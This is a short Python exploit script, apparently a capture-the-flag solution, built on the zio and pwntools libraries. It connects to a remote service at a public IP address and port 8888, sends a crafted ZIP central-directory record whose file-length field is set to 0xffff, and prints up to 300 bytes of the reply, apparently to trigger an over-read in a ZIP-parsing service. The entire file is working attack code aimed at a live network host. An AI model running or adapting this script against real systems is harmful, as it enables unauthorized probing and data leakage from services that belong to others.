from zio import *
from pwn import *
context(arch = 'i386', os = 'linux')

target = ("127.0.0.1", 8888)
target = ("159.203.87.2", 8888)
def get_io(target):
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def pwn(io):

	file_len = l16(0xffff)
	pk_sign = "PK\x01\x02"
	payload = pk_sign + 'a' * 24 + file_len + 'a' * 47
	io.write(payload)
	data = io.read(300)
	print data
	#io.interact()

io = get_io(target)
pwn(io)